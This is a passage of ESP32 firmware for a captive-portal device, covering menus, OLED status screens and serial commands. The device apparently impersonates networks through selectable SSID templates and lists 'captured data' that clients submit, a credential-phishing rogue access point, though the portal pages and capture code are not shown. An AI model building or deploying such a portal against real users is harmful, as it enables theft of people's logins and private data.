  if (wasPressed(1)) {  // CENTER - toggle
    if (portalRunning) stopPortal();
    else startPortal();
    screenDirty = true;
  }
  if (wasPressed(2)) {  // RIGHT - view captures
    currentScreen = SCREEN_CAPTURES;
    screenDirty = true;
  }
  if (wasHeld(0) || wasHeld(1) || wasHeld(2)) {
    stopPortal();
    currentScreen = SCREEN_MAIN_MENU;
    screenDirty = true;
  }
}

void handleCaptures() {
  if (wasPressed(0) || wasPressed(1) || wasPressed(2)) {
    currentScreen = SCREEN_MAIN_MENU;
    screenDirty = true;
  }
}

// ============================================================================
// RENDER SCREENS
// ============================================================================

void renderMainMenu() {
  if (!displayFound) return;
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("== CAPTIVE PORTAL ==");
  display.println();
  
  const char* items[] = {"Start Portal", "View Captures", portalRunning ? "Stop Portal" : "Start Portal", "Status"};
  for (uint8_t i = 0; i < 4; i++) {
    display.print(i == menuIndex ? "> " : "  ");
    display.println(items[i]);
  }
  
  display.println();
  if (portalRunning) {
    display.print("Clients: ");
    display.println(connectedClients);
  }
  display.setCursor(0, 56);
  display.println("L/R:nav C:select HLD:reset");
  display.display();
}

void renderTemplateSelect() {
  if (!displayFound) return;
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("== SELECT TEMPLATE ==");
  
  display.setCursor(0, 14);
  display.print("Selected: ");
  display.setTextColor(SSD1306_WHITE);
  display.println(TEMPLATE_NAMES[templateIndex]);
  
  display.println();
  
  int8_t start = max(0, (int)(templateIndex - 1));
  int8_t end = min((int)TEMPLATE_COUNT, (int)(start + 3));
  start = max(0, end - 3);
  
  for (int8_t i = start; i < end; i++) {
    display.print(i == templateIndex ? "> " : "  ");
    display.print(i + 1);
    display.print(". ");
    display.setTextColor(i == templateIndex ? SSD1306_WHITE : SSD1306_BLACK);
    display.println(TEMPLATE_NAMES[i]);
    display.setTextColor(SSD1306_WHITE);
  }
  
  display.setCursor(0, 56);
  display.println("L/R:nav C:start HLD:back");
  display.display();
}

void renderPortalStatus() {
  if (!displayFound) return;
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("== PORTAL STATUS ==");
  
  display.print("SSID: ");
  display.println(TEMPLATE_SSIDS[activeTemplate]);
  
  display.print("Tmpl: ");
  display.println(TEMPLATE_NAMES[activeTemplate]);
  
  display.print("Clients: ");
  display.println(connectedClients);
  
  display.print("Captures: ");
  display.println(captureCount);
  
  display.setCursor(0, 44);
  display.print("IP: ");
  display.println(WiFi.softAPIP().toString().c_str());
  
  display.setCursor(0, 56);
  display.println("L:menu C:stop R:data");
  display.display();
}

void renderCaptures() {
  if (!displayFound) return;
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("== CAPTURED DATA ==");
  
  display.print("Template: ");
  display.println(TEMPLATE_NAMES[activeTemplate]);
  
  display.print("Count: ");
  display.println(captureCount);
  display.println();
  
  if (captureCount > 0) {
    uint8_t idx = (captureIndex + CAPTURE_MAX - 1) % CAPTURE_MAX;
    display.println("Last:");
    String data(captures[idx].data);
    if (data.length() > 20) data = data.substring(0, 20) + "...";
    display.println(data);
  } else {
    display.println("(none yet)");
  }
  
  display.setCursor(0, 56);
  display.println("Any btn: back");
  display.display();
}

// ============================================================================
// SERIAL COMMANDS
// ============================================================================

void handleSerialCommand() {
  if (!Serial.available()) return;
  
  String cmd = Serial.readStringUntil('\n');
  cmd.trim();
  
  if (cmd.startsWith("AT+PORTAL=")) {
    String sub = cmd.substring(10);
    
    if (sub == "START") {
      if (!portalRunning) startPortal();
    }
    else if (sub == "STOP") {
      stopPortal();
    }
    else if (sub == "STATUS") {
      Serial.printf("Portal: %s | Clients: %d | Template: %s\n",
        portalRunning ? "RUNNING" : "OFF", connectedClients, TEMPLATE_NAMES[activeTemplate]);
    }
    else if (sub.startsWith("TEMPLATE=")) {
      String name = sub.substring(9);
      for (int i = 0; i < TEMPLATE_COUNT; i++) {
        if (String(TEMPLATE_NAMES[i]).indexOf(name) != -1) {
          activeTemplate = (PortalTemplate)i;
          Serial.printf("Template set to: %s\n", TEMPLATE_NAMES[i]);
          return;
        }
      }
      Serial.println("Unknown template. Use AT+PORTAL=LIST");
    }
    else if (sub == "LIST") {
      Serial.println("Templates:");
      for (int i = 0; i < TEMPLATE_COUNT; i++) {
        Serial.printf("  %d: %s (%s)\n", i, TEMPLATE_NAMES[i], TEMPLATE_SSIDS[i]);
      }
    }
    else if (sub == "CAPTURES" || sub == "DATA") {
      Serial.println("Captures:");
      for (uint8_t i = 0; i < captureCount; i++) {
        uint8_t idx = (captureIndex + CAPTURE_MAX - captureCount + i) % CAPTURE_MAX;
        Serial.printf("  [%d] %s\n", i + 1, captures[idx].data);
      }
      if (captureCount == 0) Serial.println("  (none)");
    }
    else if (sub == "CLEAR") {
      captureCount = 0;
      captureIndex = 0;
      memset(captures, 0, sizeof(captures));
      Serial.println("Captures cleared");
    }
    else if (sub == "HELP") {
      Serial.println("AT+PORTAL=START/STOP/STATUS/LIST/TEMPLATE=<name>/CAPTURES/CLEAR/HELP");
    }
    else {
      Serial.println("AT+PORTAL=HELP for commands");
    }
  }
  else if (cmd == "AT+HELP" || cmd == "HELP") {
    Serial.println("Commands:");
    Serial.println("  AT+PORTAL=START/STOP/STATUS/LIST/TEMPLATE=<name>/CAPTURES/CLEAR/HELP");
    Serial.println("  AT+HELP - this help");
  }
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
  Serial.begin(115200);
  Serial.println("\n\nESP32 Captive Portal - Educational Research Edition");
  Serial.println("=====================================================\n");
  
  // Button pins
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_CENTER, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  
  // LED
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  
  // I2C for display
  Wire.begin(OLED_SDA, OLED_SCL);
  
  // Display init
  if (display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    displayFound = true;
    display.display();
    Serial.println("Display: OK");
  } else {
    Serial.println("Display: Not found (continuing without)");
  }
  
  displayBootScreen();
  delay(1500);
  
  currentScreen = SCREEN_MAIN_MENU;
  screenDirty = true;
  
  Serial.println("\nButtons: L=nav, C=select, Hold=reset");
  Serial.println("Serial: AT+PORTAL=START/STOP/STATUS/LIST/HELP\n");
}

// ============================================================================
// LOOP
// ============================================================================

void loop() {
  updateButtons();
  updatePortal();
  handleSerialCommand();
  
  // Handle current screen
  switch (currentScreen) {
    case SCREEN_MAIN_MENU:
      handleMainMenu();
      if (screenDirty && displayFound) {
        renderMainMenu();
        screenDirty = false;
      }
      break;
      
    case SCREEN_TEMPLATE_SELECT:
      handleTemplateSelect();
      if (screenDirty && displayFound) {
        renderTemplateSelect();
        screenDirty = false;
      }
      break;
      
    case SCREEN_PORTAL_STATUS:
      handlePortalStatus();
      if (screenDirty && displayFound) {
        renderPortalStatus();
        screenDirty = false;
      }
      break;
      
    case SCREEN_CAPTURES:
      handleCaptures();
      if (screenDirty && displayFound) {
        renderCaptures();
        screenDirty = false;
      }
      break;
  }
  
  // Update status periodically when portal running
  static unsigned long lastStatusUpdate = 0;
  if (portalRunning && millis() - lastStatusUpdate > 2000) {
    screenDirty = true;
    lastStatusUpdate = millis();
  }
}
